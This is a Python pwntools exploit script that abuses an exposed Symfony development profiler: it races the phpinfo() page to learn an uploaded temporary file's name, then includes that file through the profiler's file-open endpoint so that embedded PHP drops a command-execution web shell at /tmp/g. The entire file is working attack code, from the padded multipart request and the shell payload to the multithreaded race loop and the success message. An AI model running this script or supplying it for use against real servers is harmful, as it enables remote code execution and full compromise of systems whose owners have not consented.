import sys
import threading
from pwn import *

# Configuration variables
HOST = "127.0.0.1"
PORT = 8088
POOL_SIZE = 10
MAX_ATTEMPTS = 100
TAG = "Security Test"
PAYLOAD = f"{TAG}\r\n<?php $c=fopen('/tmp/g','w');fwrite($c,'<?php passthru($_GET[\"f\"]);?>');?>\r\n"
BOUNDARY = "---------------------------7dbff1ded0714"
REQ1_DATA = f"""--{BOUNDARY}\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{PAYLOAD}--{BOUNDARY}--\r"""
PADDING = "A" * 4000
REQ1 = f"""POST /app_dev.php/_profiler/phpinfo?a={PADDING} HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={PADDING}\r
HTTP_ACCEPT: {PADDING}\r
HTTP_USER_AGENT: {PADDING}\r
HTTP_ACCEPT_LANGUAGE: {PADDING}\r
HTTP_PRAGMA: {PADDING}\r
Content-Type: multipart/form-data; boundary={BOUNDARY}\r
Content-Length: {len(REQ1_DATA)}\r
Host: {HOST}\r
\r
{REQ1_DATA}"""
LFIREQ = "GET /app_dev.php/_profiler/open?file={} HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: {}\r\n\r\n"
def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    try:
        with remote(host, port) as s, remote(host, port) as s2:
            s.send(phpinforeq)
            d = s.recvn(offset).decode()
            match = re.search(r'\[tmp_name\] =&gt; (\/[^\s]+)', d)
            if not match:
                print("[DEBUG] No match found for tmp_name")
                return None

            fn = match.group(1)
            print(f"[DEBUG] Extracted filename: {fn}")
            
            s2.send(lfireq.format(fn, host))
            d = s2.recv(4096).decode()
            if tag in d:
                return fn
    except Exception as e:
        print(f"Error during PHPInfoLFI: {e}")
        return None

def getOffset(host, port, phpinforeq):
    try:
        with remote(host, port, timeout=10) as s:
            s.send(phpinforeq)
            d = s.recvall().decode()
            i = d.find("[tmp_name] =&gt")
            if i == -1:
                raise ValueError("No php tmp_name in phpinfo output")
            print(f"found {d[i:i+10]} at {i}")
            return i + 256
    except Exception as e:
        print(f"Error in getOffset: {e}")
        return None

class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        super().__init__()
        self.event = e
        self.lock = l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter += 1
            if phpInfoLFI(*self.args):
                print("\nGot it! Shell created in /tmp/g")
                self.event.set()

def main():
    global counter
    counter = 0

    if len(sys.argv) > 1:
        host = sys.argv[1]
    else:
        host = HOST

    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    poolsz = int(sys.argv[3]) if len(sys.argv) > 3 else POOL_SIZE

    print("LFI With PHPInfo()")
    print("-=" * 30)
    print("Getting initial offset...", end=" ")

    offset = getOffset(host, port, REQ1)
    if offset is None:
        print("Failed to get offset. Exiting.")
        sys.exit(1)

    e = threading.Event()
    l = threading.Lock()

    print(f"Spawning worker pool ({poolsz})...")

    tp = [ThreadWorker(e, l, MAX_ATTEMPTS, host, port, REQ1, offset, LFIREQ, TAG) for _ in range(poolsz)]
    for t in tp:
        t.start()

    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                print(f"\r{counter} / {MAX_ATTEMPTS}", end="")
                if counter >= MAX_ATTEMPTS:
                    break
        print()
        print("Woot! \\m/" if e.is_set() else ":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("Shutting down...")
    for t in tp:
        t.join()

if __name__ == "__main__":
    main()